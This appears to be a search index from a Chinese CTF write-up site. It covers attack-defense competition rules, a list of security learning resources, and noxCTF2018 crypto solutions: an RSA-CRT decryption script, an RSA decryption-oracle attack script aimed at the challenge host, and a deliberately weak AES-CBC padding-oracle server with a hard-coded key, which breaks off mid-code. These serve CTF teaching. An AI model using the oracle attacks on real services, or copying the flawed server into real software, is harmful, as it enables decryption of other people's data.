\u7684\u8d28\u91cf\uff0c\u6bcf\u4e2a\u6218\u961f\u90fd\u80fd\u6709\u4e0d\u4e00\u6837\u7684\u4f53\u9a8c\u4e0e\u63d0\u5347\u3002\u5728\"\u5206\u4eab\"\u73af\u8282\uff0c\u5bf9\u672c\u961f\u9898\u76ee\u8fdb\u884c\u8bb2\u89e3\u7684\u540c\u65f6\u4e5f\u5728\u6df1\u5316\u81ea\u5df1\u7684\u80fd\u529b\u6c34\u5e73\uff0c\u5728\u8ba8\u8bba\u56de\u7b54\u7684\u8fc7\u7a0b\u66f4\u662f\u4e00\u79cd\u601d\u7ef4\u4e92\u52a8\u7684\u73af\u8282\u3002\u5728\u8d5b\u540e\u7684\u5b66\u4e60\u603b\u7ed3\u4e2d\u80fd\u5f97\u5230\u66f4\u597d\u7684\u8ba4\u77e5\u3002","title":"\u8d5b\u5236\u603b\u8bc4"},{"location":"introduction/mode/#-attack-defense","text":"","title":"\u653b\u9632\u6a21\u5f0f - Attack &amp; Defense"},{"location":"introduction/mode/#_8","text":"\u653b\u9632\u6a21\u5f0f\u5e38\u89c1\u4e8e\u7ebf\u4e0b\u51b3\u8d5b\u3002\u5728\u653b\u9632\u6a21\u5f0f\u4e2d\uff0c\u521d\u59cb\u65f6\u523b\uff0c\u6240\u6709\u53c2\u8d5b\u961f\u4f0d\u62e5\u6709\u76f8\u540c\u7684\u7cfb\u7edf\u73af\u5883\uff08\u5305\u542b\u82e5\u5e72\u670d\u52a1\uff0c\u53ef\u80fd\u4f4d\u4e8e\u4e0d\u540c\u7684\u673a\u5668\u4e0a\uff09\uff0c\u5e38\u79f0\u4e3a gamebox\uff0c\u53c2\u8d5b\u961f\u4f0d\u6316\u6398\u7f51\u7edc\u670d\u52a1\u6f0f\u6d1e\u5e76\u653b\u51fb\u5bf9\u624b\u670d\u52a1\u83b7\u53d6 flag \u6765\u5f97\u5206\uff0c\u4fee\u8865\u81ea\u8eab\u670d\u52a1\u6f0f\u6d1e\u8fdb\u884c\u9632\u5fa1\u4ece\u800c\u9632\u6b62\u6263\u5206\uff08\u5f53\u7136\u6709\u7684\u6bd4\u8d5b\u5728\u9632\u5fa1\u4e0a\u4f1a\u8bbe\u7f6e\u5f97\u5206\uff0c\u4e00\u822c\u9632\u5fa1\u53ea\u80fd\u907f\u514d\u4e22\u5206\uff09\u3002 \u653b\u9632\u6a21\u5f0f\u53ef\u4ee5\u5b9e\u65f6\u901a\u8fc7\u5f97\u5206\u53cd\u6620\u51fa\u6bd4\u8d5b\u60c5\u51b5\uff0c\u6700\u7ec8\u4e5f\u4ee5\u5f97\u5206\u76f4\u63a5\u5206\u51fa\u80dc\u8d1f\uff0c\u662f\u4e00\u79cd\u7ade\u4e89\u6fc0\u70c8\uff0c\u5177\u6709\u5f88\u5f3a\u89c2\u8d4f\u6027\u548c\u9ad8\u5ea6\u900f\u660e\u6027\u7684\u7f51\u7edc\u5b89\u5168\u8d5b\u5236\u3002\u5728\u8fd9\u79cd\u8d5b\u5236\u4e2d\uff0c\u4e0d\u4ec5\u4ec5\u662f\u6bd4\u53c2\u8d5b\u961f\u5458\u7684\u667a\u529b\u548c\u6280\u672f\uff0c\u4e5f\u6bd4\u4f53\u529b\uff08\u56e0\u4e3a\u6bd4\u8d5b\u4e00\u822c\u90fd\u4f1a\u6301\u7eed 48 \u5c0f\u65f6\uff09\uff0c\u540c\u65f6\u4e5f\u6bd4\u56e2\u961f\u4e4b\u95f4\u7684\u5206\u5de5\u914d\u5408\u4e0e\u5408\u4f5c\u3002 \u4e00\u822c\u6bd4\u8d5b\u7684\u5177\u4f53\u73af\u5883\u4f1a\u5728\u5f00\u8d5b\u524d\u4e00\u5929\u6216\u8005\u5f53\u5929\u5f00\u8d5b\u524d\u534a\u5c0f\u65f6\u7531\u6bd4\u8d5b\u4e3b\u529e\u65b9\u7ed9\u51fa\uff08\u662f\u4e00\u4efd\u51e0\u9875\u7684\u5c0f\u6587\u6863\uff09\u3002\u5728\u8fd9\u4e00\u6bb5\u65f6\u95f4\u5185\uff0c\u4f60\u9700\u8981\u6839\u636e\u4e3b\u529e\u65b9\u63d0\u4f9b\u7684\u6587\u6863\u719f\u6089\u73af\u5883\u5e76\u505a\u597d\u9632\u5fa1\u3002 \u5728\u6bd4\u8d5b\u5f00\u59cb\u524d\u534a\u5c0f\u65f6\uff0c\u8fd9\u534a\u5c0f\u65f6\u5185\u662f\u65e0\u6cd5\u8fdb\u884c\u653b\u51fb\u7684\uff0c\u5404\u652f\u961f\u4f0d\u90fd\u4f1a\u52a0\u7d27\u719f\u6089\u6bd4\u8d5b\u7f51\u7edc\u73af\u5883\uff0c\u5e76\u505a\u597d\u9632\u5fa1\u51c6\u5907\u3002\u81f3\u4e8e\u654c\u65b9 Gamebox \u7684 IP \u5730\u5740\uff0c\u5219\u9700\u8981\u9760\u4f60\u81ea\u5df1\u5728\u7ed9\u51fa\u7f51\u6bb5\u4e2d\u53d1\u73b0\u3002 \u5982\u679c\u662f\u5206\u4e3a\u4e0a\u5348\u4e0b\u5348\u4e24\u573a\u653b\u9632\u8d5b\u7684\u8bdd\uff0c\u90a3\u4e48\u4e0a\u5348\u548c\u4e0b\u5348\u7684 Gamebox \u6f0f\u6d1e\u670d\u52a1\u4f1a\u66f4\u6362\uff08\u907f\u514d\u6bd4\u8d5b\u4e2d\u9014\u4f11\u606f\u65f6\u9009\u624b\u4ea4\u6d41\uff09\uff0c\u4f46\u7ba1\u7406\u65f6\u8981\u7528\u7684 IP \u5730\u5740\u4ec0\u4e48\u7684\u4e0d\u4f1a\u6539\u53d8\u3002\u4e5f\u5c31\u662f \u4e0b\u5348\u4f1a\u6362\u65b0\u9898 \u3002 \u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u4e3b\u529e\u65b9\u4f1a\u63d0\u4f9b\u7f51\u7ebf\uff0c \u4f46\u5e76\u4e0d\u4f1a\u63d0\u4f9b\u7f51\u7ebf\u8f6c\u63a5\u53e3\uff0c\u6240\u4ee5\u9700\u8981\u81ea\u5907\u3002","title":"\u6982\u8ff0"},{"location":"introduction/mode/#_9","text":"\u653b\u9632\u6a21\u5f0f\u4e00\u822c\u7684\u89c4\u5219\u5982\u4e0b \u6218\u961f\u521d\u59cb\u5206\u6570\u5747\u4e3a x \u5206 \u6bd4\u8d5b\u4ee5 5/10 \u5206\u949f\u4e3a\u4e00\u4e2a\u56de\u5408\uff0c\u6bcf\u56de\u5408\u4e3b\u529e\u65b9\u4f1a\u66f4\u65b0\u5df2\u653e\u51fa\u670d\u52a1\u7684 Flag \u6bcf\u56de\u5408\u5185\uff0c\u4e00\u4e2a\u6218\u961f\u7684\u4e00\u4e2a\u670d\u52a1\u88ab\u6e17\u900f\u653b\u51fb\u6210\u529f\uff08\u88ab\u62ff Flag \u5e76\u63d0\u4ea4\uff09\uff0c\u5219\u6263\u9664\u4e00\u5b9a\u5206\u6570\uff0c\u653b\u51fb\u6210\u529f\u7684\u6218\u961f\u5e73\u5206\u8fd9\u4e9b\u5206\u3002 \u6bcf\u56de\u5408\u5185\uff0c\u5982\u679c\u6218\u961f\u80fd\u591f\u7ef4\u62a4\u81ea\u5df1\u7684\u670d\u52a1\u6b63\u5e38\u8fd0\u884c\uff0c\u5219\u5206\u6570\u4e0d\u4f1a\u51cf\u5c11\uff08\u5982\u679c\u9632\u5fa1\u6210\u529f\u52a0\u5206\u5219\u4f1a\u52a0\u5206\uff09\uff1b \u5982\u679c\u4e00\u4e2a\u670d\u52a1\u5b95\u673a\u6216\u5f02\u5e38\u65e0\u6cd5\u901a\u8fc7\u6d4b\u8bd5\uff0c\u5219\u53ef\u80fd\u4f1a\u6263\u5206\uff0c\u670d\u52a1\u6b63\u5e38\u7684\u6218\u961f\u5e73\u5206\u8fd9\u4e9b\u5206\u3002\u5f80\u5f80\u670d\u52a1\u5f02\u5e38\u4f1a\u6263\u9664\u8f83\u591a\u7684\u5206\u6570\u3002 \u5982\u679c\u8be5\u56de\u5408\u5185\u6240\u6709\u6218\u961f\u7684\u670d\u52a1\u90fd\u5f02\u5e38\uff0c\u5219\u8ba4\u4e3a\u662f\u4e0d\u53ef\u6297\u62d2\u56e0\u7d20\u9020\u6210\uff0c\u5206\u6570\u90fd\u4e0d\u51cf\u5c11\u3002 \u6bcf\u56de\u5408\u5185\uff0c\u670d\u52a1\u5f02\u5e38\u548c\u88ab\u62ff Flag \u53ef\u4ee5\u540c\u65f6\u53d1\u751f\uff0c\u5373\u6218\u961f\u5728\u4e00\u4e2a\u56de\u5408\u5185\u5355\u4e2a\u670d\u52a1\u53ef\u80fd\u4f1a\u6263\u9664\u4e24\u8005\u53e0\u52a0\u7684\u5206\u6570\u3002 \u7981\u6b62\u961f\u4f0d\u4f7f\u7528\u901a\u7528\u9632\u5fa1\u65b9\u6cd5 \u8bf7\u53c2\u8d5b\u961f\u4f0d\u5728\u6bd4\u8d5b\u5f00\u59cb\u65f6\u5bf9\u6240\u6709\u670d\u52a1\u8fdb\u884c\u5907\u4efd\uff0c\u82e5\u56e0\u81ea\u8eab\u539f\u56e0\u670d\u52a1\u6c38\u4e45\u635f\u574f\u6216\u4e22\u5931\uff0c\u65e0\u6cd5\u6062\u590d\uff0c\u4e3b\u529e\u65b9\u4e0d\u63d0\u4f9b\u91cd\u7f6e\u670d\u52a1 \u7981\u6b62\u5bf9\u8d5b\u9898\u4ee5\u5916\u7684\u6bd4\u8d5b\u5e73\u53f0\u53d1\u8d77\u653b\u51fb\uff0c\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\u5728 gamebox \u63d0\u6743 root\u3001\u5229\u7528\u4e3b\u529e\u65b9\u5e73\u53f0\u6f0f\u6d1e\u7b49\uff0c\u8fdd\u89c4\u8005\u7acb\u523b\u53d6\u6d88\u53c2\u8d5b\u8d44\u683c \u53c2\u8d5b\u961f\u4f0d\u5982\u679c\u53d1\u73b0\u5176\u4ed6\u961f\u4f0d\u5b58\u5728\u8fdd\u89c4\u884c\u4e3a\uff0c\u8bf7\u7acb\u523b\u4e3e\u62a5\uff0c\u6211\u4eec\u4f1a\u4e25\u683c\u5ba1\u6838\u5e76\u4f5c\u51fa\u76f8\u5e94\u5224\u7f5a\u3002","title":"\u57fa\u672c\u89c4\u5219"},{"location":"introduction/mode/#_10","text":"\u6587\u6863\u4e0a\u4e00\u822c\u90fd\u4f1a\u6709\u6bd4\u8d5b\u73af\u5883\u7684 \u7f51\u7edc\u62d3\u6251\u56fe \uff08\u5982\u4e0b\u56fe\uff09\uff0c\u6bcf\u652f\u961f\u4f0d\u4f1a\u7ef4\u62a4\u82e5\u5e72\u7684 Gamebox\uff08\u5df1\u65b9\u670d\u52a1\u5668\uff09 \uff0cGamebox \u4e0a\u90e8\u7f72\u6709\u5b58\u5728\u6f0f\u6d1e\u7684\u670d\u52a1\u3002 \u6587\u6863\u4e0a\u4f1a\u5305\u62ec\u9009\u624b\uff0c\u653b\u9632\u73af\u5883\uff0c\u4e3b\u529e\u65b9\u4e09\u8005\u7684\u73af\u5883\u3002 \u9009\u624b\u9700\u8981\u5728\u4e2a\u4eba\u7535\u8111\u4e0a\u914d\u7f6e\u6216\u8005 DHCP \u81ea\u52a8\u83b7\u53d6 IP \u5730\u5740 \u7f51\u5173 \u63a9\u7801DNS \u670d\u52a1\u5668\u5730\u5740 \u653b\u9632\u73af\u5883 Gamebox \u6240\u5904\u5730\u5740\uff0c\u5305\u62ec\u5df1\u65b9\u548c\u5176\u4ed6\u961f\u4f0d\u7684\u5730\u5740\u3002 \u6bd4\u8d5b\u4e00\u822c\u4f1a\u63d0\u4f9b\u961f\u4f0d\u7684 id \u4e0e\u5bf9\u5e94 ip \u7684\u6620\u5c04\u8868\uff0c\u4ee5\u4fbf\u4e8e\u8ba9\u9009\u624b\u6307\u5b9a\u6070\u5f53\u7684\u653b\u9632\u7b56\u7565\u3002 \u4e3b\u529e\u65b9\u73af\u5883 \u6bd4\u8d5b\u7b54\u9898\u5e73\u53f0 \u63d0\u4ea4 flag \u63a5\u53e3 \u6d41\u91cf\u8bbf\u95ee\u63a5\u53e3","title":"\u7f51\u7edc\u73af\u5883"},{"location":"introduction/mode/#gamebox","text":"\u53c2\u8d5b\u6587\u6863\u4e2d\u4f1a\u7ed9\u51fa\u961f\u4f0d\u767b\u5f55 gamebox \u7684\u65b9\u5f0f\uff0c\u4e00\u822c\u6765\u8bf4\u5982\u4e0b \u7528\u6237\u540d\u4e3a ctf \u901a\u8fc7 ssh \u767b\u5f55\uff0c\u5bc6\u7801\u6216\u8005\u79c1\u94a5\uff0c\u4e00\u822c\u4f1a\u7ed9\u51fa\u79c1\u94a5\u3002 \u81ea\u7136\uff0c\u5728\u767b\u5f55\u4e0a\u6218\u961f\u673a\u5668\u540e\u5e94\u8be5\u4fee\u6539\u6240\u6709\u7684\u9ed8\u8ba4\u5bc6\u7801\uff0c\u540c\u65f6\u4e0d\u5e94\u8be5\u8bbe\u7f6e\u5f31\u5bc6\u7801\u3002","title":"\u8bbf\u95ee Gamebox"},{"location":"introduction/resources/","text":"\u5728\u7ebf\u5b66\u4e60 \u00b6 i \u6625\u79cb-\u4e13\u4e1a\u7684\u7f51\u7edc\u5b89\u5168|\u4fe1\u606f\u5b89\u5168\u5728\u7ebf\u5b66\u4e60\u57f9\u8bad\u5e73\u53f0 \u5b9e\u9a8c\u5427\uff0d\u8ba9\u5b9e\u9a8c\u66f4\u7b80\u5355\uff01 \u770b\u96ea\u77e5\u8bc6\u5e93 \u5b66\u4e60\u8def\u7ebf \u00b6 \u77e5\u9053\u521b\u5b87\u7814\u53d1\u6280\u80fd\u8868 v3.1 \u6f0f\u6d1e\u94f6\u884c(BUGBANK)\u6280\u80fd\u6811 \u5b89\u5168\u6280\u80fd\u6811\u7b80\u7248 by \u4f59\u5f26 \u5b89\u5168\u7c7b\u601d\u7ef4\u5bfc\u56fe by phith0n \u4fe1\u606f\u5b89\u5168\u4ece\u4e1a\u8005\u4e66\u5355\u63a8\u8350 \u4fe1\u606f\u8d44\u8baf \u00b6 FreeBuf.COM | \u5173\u6ce8\u9ed1\u5ba2\u4e0e\u6781\u5ba2 \u5b89\u5168\u5ba2 - \u6709\u601d\u60f3\u7684\u5b89\u5168\u65b0\u5a92\u4f53 \u5636\u543c RoarTalk \u2013 \u56de\u5f52\u6700\u672c\u8d28\u7684\u4fe1\u606f\u5b89\u5168 Sec-News \u5b89\u5168\u6587\u6458 \u6280\u672f\u8bba\u575b \u00b6 \u543e\u7231\u7834\u89e3 \u770b\u96ea\u8bba\u575b \u5148\u77e5\u793e\u533a i\u6625\u79cb\u8bba\u575b CTF \u8d5b\u4e8b \u00b6 XCTF\u793e\u533a CTFtime CTF Rank CTF OJ \u00b6 XCTF OJ CTF\u5927\u672c\u8425 pwnhub \u5357\u90ae\u7f51\u7edc\u653b\u9632\u8bad\u7ec3\u5e73\u53f0 HackingLab \u7f51\u7edc\u4fe1\u606f\u5b89\u5168\u653b\u9632\u5b66\u4e60\u5e73\u53f0 BugkuCTF WeChall Sniper OJ Jarvis OJ CTF Learn Hackme CTF Practice CTF List CTF \u5de5\u5177 \u00b6 \u770b\u96ea\u5de5\u5177 \u543e\u7231\u7834\u89e3\u5de5\u5177 CTF\u5728\u7ebf\u5de5\u5177 by CTFcode CTF\u5728\u7ebf\u5de5\u5177\u7bb1 by bugku CTF\u5de5\u5177\u8d44\u6e90\u5e93 by HBCTF team ctf-tools by zardus The Cyber Swiss Army Knife CTF Writeup \u96c6\u5408 \u00b6 CTFs Writeup \u96c6\u9526 CTF solution by p4 team","title":"Resources"},{"location":"introduction/resources/#_1","text":"i \u6625\u79cb-\u4e13\u4e1a\u7684\u7f51\u7edc\u5b89\u5168|\u4fe1\u606f\u5b89\u5168\u5728\u7ebf\u5b66\u4e60\u57f9\u8bad\u5e73\u53f0 \u5b9e\u9a8c\u5427\uff0d\u8ba9\u5b9e\u9a8c\u66f4\u7b80\u5355\uff01 \u770b\u96ea\u77e5\u8bc6\u5e93","title":"\u5728\u7ebf\u5b66\u4e60"},{"location":"introduction/resources/#_2","text":"\u77e5\u9053\u521b\u5b87\u7814\u53d1\u6280\u80fd\u8868 v3.1 \u6f0f\u6d1e\u94f6\u884c(BUGBANK)\u6280\u80fd\u6811 \u5b89\u5168\u6280\u80fd\u6811\u7b80\u7248 by \u4f59\u5f26 \u5b89\u5168\u7c7b\u601d\u7ef4\u5bfc\u56fe by phith0n \u4fe1\u606f\u5b89\u5168\u4ece\u4e1a\u8005\u4e66\u5355\u63a8\u8350","title":"\u5b66\u4e60\u8def\u7ebf"},{"location":"introduction/resources/#_3","text":"FreeBuf.COM | \u5173\u6ce8\u9ed1\u5ba2\u4e0e\u6781\u5ba2 \u5b89\u5168\u5ba2 - \u6709\u601d\u60f3\u7684\u5b89\u5168\u65b0\u5a92\u4f53 \u5636\u543c RoarTalk \u2013 \u56de\u5f52\u6700\u672c\u8d28\u7684\u4fe1\u606f\u5b89\u5168 Sec-News \u5b89\u5168\u6587\u6458","title":"\u4fe1\u606f\u8d44\u8baf"},{"location":"introduction/resources/#_4","text":"\u543e\u7231\u7834\u89e3 \u770b\u96ea\u8bba\u575b \u5148\u77e5\u793e\u533a i\u6625\u79cb\u8bba\u575b","title":"\u6280\u672f\u8bba\u575b"},{"location":"introduction/resources/#ctf","text":"XCTF\u793e\u533a CTFtime CTF Rank","title":"CTF \u8d5b\u4e8b"},{"location":"introduction/resources/#ctf-oj","text":"XCTF OJ CTF\u5927\u672c\u8425 pwnhub \u5357\u90ae\u7f51\u7edc\u653b\u9632\u8bad\u7ec3\u5e73\u53f0 HackingLab \u7f51\u7edc\u4fe1\u606f\u5b89\u5168\u653b\u9632\u5b66\u4e60\u5e73\u53f0 BugkuCTF WeChall Sniper OJ Jarvis OJ CTF Learn Hackme CTF Practice CTF List","title":"CTF OJ"},{"location":"introduction/resources/#ctf_1","text":"\u770b\u96ea\u5de5\u5177 \u543e\u7231\u7834\u89e3\u5de5\u5177 CTF\u5728\u7ebf\u5de5\u5177 by CTFcode CTF\u5728\u7ebf\u5de5\u5177\u7bb1 by bugku CTF\u5de5\u5177\u8d44\u6e90\u5e93 by HBCTF team ctf-tools by zardus The Cyber Swiss Army Knife","title":"CTF \u5de5\u5177"},{"location":"introduction/resources/#ctf-writeup","text":"CTFs Writeup \u96c6\u9526 CTF solution by p4 team","title":"CTF Writeup \u96c6\u5408"},{"location":"noxCTF2018/crypto/Chop_Suey/writeup/","text":"Chop_Suey \u00b6 RSA\u4e2d\u5df2\u77e5dp,dq,q,p,c\u6c42m\u7684\u95ee\u9898 \u5206\u6790\u6587\u7ae0: http://skysec.top/2018/08/25/RSA%E4%B9%8B%E6%8B%92%E7%BB%9D%E5%A5%97%E8%B7%AF-2/ exp.py import binascii import struct # return (g, x, y) a*x + b*y = gcd(x, y) def egcd ( a , b ): if a == 0 : return ( b , 0 , 1 ) else : g , x , y = egcd ( b % a , a ) return ( g , y - ( b // a ) * x , x ) def decryptRSA ( p , q , e , ct ): # compute n n = p * q phi = ( p - 1 ) * ( q - 1 ) gcd , a , b = egcd ( e , phi ) d = a print \"d: \" + str ( d ) pt = pow ( ct , d , n ) return pt def encryptRSA ( p , q , e , pt ): # compute n n = p * q phi = ( p - 1 ) * ( q - 1 ) gcd , a , b = egcd ( e , phi ) d = a print \"d: \" + str ( d ) ct = pow ( pt , e , n ) return ct def convert ( int_value ): encoded = format ( int_value , 'x' ) length = len ( encoded ) encoded = encoded . zfill ( length + length % 2 ) return encoded . decode ( 'hex' ) # x = mulinv(b) mod n, (x * b) % n == 1 def mulinv ( b , n ): g , x , _ = egcd ( b , n ) if g == 1 : return x % n def main (): # By implementing Chinese remainder algorithm # 1) p and q are the primes # 2) dp = d mod (p - 1) # 3) dq = d mod (q - 1) # 4) Qinv = 1/q mod p *This is not integer devision but multiplicative inverse # 5) m1 = pow(c, dp, p) # 6) m2 = pow(c, dq, q) # 7-1) h = Qinv(m1 - m2) mod p ; if m1 < m2 # 7-2) h = Qinv * (m1 + q/p) # 8) m = m2 + hq # m = 65 # p = 61 # q = 53 # dp = 53 # dq = 49 # c = 2790 p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852 Qinv = mulinv ( q , p ) print \"Qinv: \" + str ( Qinv ) m1 = pow ( c , dp , p ) print \"m1: \" + str ( m1 ) m2 = pow ( c , dq , q ) print \"m2: \" + str ( m2 ) h = ( Qinv * ( m1 - m2 )) % p print \"h: \" + str ( h ) m = m2 + ( h * q ) print \"m: \" + str ( int ( m )) hexadecimals = str ( hex ( m ))[ 2 : - 1 ] print \"solved: \" + str ( binascii . unhexlify ( hexadecimals )) # solved: Theres_more_than_one_way_to_RSA if __name__ == \"__main__\" : main ()","title":"Chop_Suey"},{"location":"noxCTF2018/crypto/Chop_Suey/writeup/#chop_suey","text":"RSA\u4e2d\u5df2\u77e5dp,dq,q,p,c\u6c42m\u7684\u95ee\u9898 \u5206\u6790\u6587\u7ae0: http://skysec.top/2018/08/25/RSA%E4%B9%8B%E6%8B%92%E7%BB%9D%E5%A5%97%E8%B7%AF-2/ exp.py import binascii import struct # return (g, x, y) a*x + b*y = gcd(x, y) def egcd ( a , b ): if a == 0 : return ( b , 0 , 1 ) else : g , x , y = egcd ( b % a , a ) return ( g , y - ( b // a ) * x , x ) def decryptRSA ( p , q , e , ct ): # compute n n = p * q phi = ( p - 1 ) * ( q - 1 ) gcd , a , b = egcd ( e , phi ) d = a print \"d: \" + str ( d ) pt = pow ( ct , d , n ) return pt def encryptRSA ( p , q , e , pt ): # compute n n = p * q phi = ( p - 1 ) * ( q - 1 ) gcd , a , b = egcd ( e , phi ) d = a print \"d: \" + str ( d ) ct = pow ( pt , e , n ) return ct def convert ( int_value ): encoded = format ( int_value , 'x' ) length = len ( encoded ) encoded = encoded . zfill ( length + length % 2 ) return encoded . decode ( 'hex' ) # x = mulinv(b) mod n, (x * b) % n == 1 def mulinv ( b , n ): g , x , _ = egcd ( b , n ) if g == 1 : return x % n def main (): # By implementing Chinese remainder algorithm # 1) p and q are the primes # 2) dp = d mod (p - 1) # 3) dq = d mod (q - 1) # 4) Qinv = 1/q mod p *This is not integer devision but multiplicative inverse # 5) m1 = pow(c, dp, p) # 6) m2 = pow(c, dq, q) # 7-1) h = Qinv(m1 - m2) mod p ; if m1 < m2 # 7-2) h = Qinv * (m1 + q/p) # 8) m = m2 + hq # m = 65 # p = 61 # q = 53 # dp = 53 # dq = 49 # c = 2790 p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852 Qinv = mulinv ( q , p ) print \"Qinv: \" + str ( Qinv ) m1 = pow ( c , dp , p ) print \"m1: \" + str ( m1 ) m2 = pow ( c , dq , q ) print \"m2: \" + str ( m2 ) h = ( Qinv * ( m1 - m2 )) % p print \"h: \" + str ( h ) m = m2 + ( h * q ) print \"m: \" + str ( int ( m )) hexadecimals = str ( hex ( m ))[ 2 : - 1 ] print \"solved: \" + str ( binascii . unhexlify ( hexadecimals )) # solved: Theres_more_than_one_way_to_RSA if __name__ == \"__main__\" : main ()","title":"Chop_Suey"},{"location":"noxCTF2018/crypto/Decryptor/writeup/","text":"Decrypto \u00b6 nc\u8fde\u63a5\u540e\u662f\u4e2aRSA\u89e3\u5bc6\u7a0b\u5e8f\uff0c\u53d1\u9001c\u768416\u8fdb\u5236\u4f1a\u8fd4\u56de\u89e3\u5bc6\u540e\u7684m\uff0c\u4f46\u9650\u5236\u4e0d\u80fd\u89e3\u5bc6\u9898\u76ee\u7ed9\u7684c\u3002 \u53ef\u4ee5\u628ac\u5206\u89e3\u4e3ac1*c2\u3002 \u56e0\u4e3a m\u2261c d mod n m\u2261(c1*c2) d mod n \u8bbe m1\u2261c1 d mod n m2\u2261c2 d mod n \u5219 m\u2261(m1*m2) mod n \u6240\u4ee5\u53ea\u8981\u5c06c1,c2\u53d1\u9001\u7ed9\u670d\u52a1\u7aef\u89e3\u5bc6\uff0c\u5f97\u5230m1\u548cm2\u5373\u53ef\u5f97\u5230\u660e\u6587\u3002 exp.py: from pwn import * from Crypto.Util.number import * n = 140165355674296399459239442258630641339281917770736077969396713192714338090714726890918178888723629353043167144351074222216025145349467583141291274172356560132771690830020353668100494447956043734613525952945037667879068512918232837185005693504551982611886445611514773529698595162274883360353962852882911457919 c1 = 2 * 11 * 11633 c2 = 337776996205622514139897267259622439941441577050030472993857902470788424676204277856454319830164782994228390126907608894811791518457376474361092974276605202489697046967039975326799197021653060520761195507307194624139422604620483078617109192392046282600537260825743758255965171978527573880584944049011359 c1 = hex ( c1 )[ 2 :] . rstrip ( 'L' ) c2 = hex ( c2 )[ 2 :] . rstrip ( 'L' ) r1 = remote ( 'chal.noxale.com' , 4242 ) r1 . recvline () r1 . send ( c1 ) m1 = int ( r1 . recvline (), 16 ) r1 . close () r2 = remote ( 'chal.noxale.com' , 4242 ) r2 . recvline () r2 . send ( c2 ) m2 = int ( r2 . recvline (), 16 ) r2 . close () m = ( m1 * m2 ) % n print long_to_bytes ( m ) \u56e0\u6570\u5206\u89e3\u7f51\u7ad9\uff1a http://factordb.com/index.php","title":"Decryptor"},{"location":"noxCTF2018/crypto/Decryptor/writeup/#decrypto","text":"nc\u8fde\u63a5\u540e\u662f\u4e2aRSA\u89e3\u5bc6\u7a0b\u5e8f\uff0c\u53d1\u9001c\u768416\u8fdb\u5236\u4f1a\u8fd4\u56de\u89e3\u5bc6\u540e\u7684m\uff0c\u4f46\u9650\u5236\u4e0d\u80fd\u89e3\u5bc6\u9898\u76ee\u7ed9\u7684c\u3002 \u53ef\u4ee5\u628ac\u5206\u89e3\u4e3ac1*c2\u3002 \u56e0\u4e3a m\u2261c d mod n m\u2261(c1*c2) d mod n \u8bbe m1\u2261c1 d mod n m2\u2261c2 d mod n \u5219 m\u2261(m1*m2) mod n \u6240\u4ee5\u53ea\u8981\u5c06c1,c2\u53d1\u9001\u7ed9\u670d\u52a1\u7aef\u89e3\u5bc6\uff0c\u5f97\u5230m1\u548cm2\u5373\u53ef\u5f97\u5230\u660e\u6587\u3002 exp.py: from pwn import * from Crypto.Util.number import * n = 140165355674296399459239442258630641339281917770736077969396713192714338090714726890918178888723629353043167144351074222216025145349467583141291274172356560132771690830020353668100494447956043734613525952945037667879068512918232837185005693504551982611886445611514773529698595162274883360353962852882911457919 c1 = 2 * 11 * 11633 c2 = 337776996205622514139897267259622439941441577050030472993857902470788424676204277856454319830164782994228390126907608894811791518457376474361092974276605202489697046967039975326799197021653060520761195507307194624139422604620483078617109192392046282600537260825743758255965171978527573880584944049011359 c1 = hex ( c1 )[ 2 :] . rstrip ( 'L' ) c2 = hex ( c2 )[ 2 :] . rstrip ( 'L' ) r1 = remote ( 'chal.noxale.com' , 4242 ) r1 . recvline () r1 . send ( c1 ) m1 = int ( r1 . recvline (), 16 ) r1 . close () r2 = remote ( 'chal.noxale.com' , 4242 ) r2 . recvline () r2 . send ( c2 ) m2 = int ( r2 . recvline (), 16 ) r2 . close () m = ( m1 * m2 ) % n print long_to_bytes ( m ) \u56e0\u6570\u5206\u89e3\u7f51\u7ad9\uff1a http://factordb.com/index.php","title":"Decrypto"},{"location":"noxCTF2018/crypto/Java_Corporation/writeup/","text":"Java_Corporation \u00b6 given_server.py: import socket import threading import random from Crypto.Cipher import AES key = 'NotGonnaHappen' class ThreadedServer ( object ): def __init__ ( self , host , port ): self . host = host self . port = port self . sock = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) self . sock . setsockopt ( socket . SOL_SOCKET , socket . SO_REUSEADDR , 1 ) self . sock . bind (( self . host , self . port )) def listen ( self ): self . sock . listen ( 20 ) while True : client , address = self . sock . accept () client . settimeout ( 60 ) threading . Thread ( target = self . listenToClient , args = ( client , address )) . start () def getIV ( self ): return '' . join ([ chr ( random . randrange ( 0 , 256 )) for i in range ( 16 )]) def encrypt ( self , plaintext ): iv = self . getIV () aes = AES . new ( key , AES . MODE_CBC , iv ) return iv + aes . encrypt ( plaintext ) def decrypt ( self , ciphertext ): aes = AES . new ( key , AES . MODE_CBC , ciphertext [: 16 ]) return aes . decrypt ( ciphertext [ 16 :]) def pkcs5 ( self , s ): pad_len = (( - len ( s )) % 16 ) if pad_len == 0 : pad_len = 16 return s + chr ( pad_len ) * pad_len def check_pad ( self , s ): pad_len = ord ( s [ - 1 ]) if pad_len > 16 or pad_len == 0 : return False pad = s [ - pad_len :] for byte in pad : if ord ( byte ) != pad_len : return False return True def listenToClient ( self , client , address ): while True : try : length = int ( client . recv ( 2 )) if ( length % 16 != 0 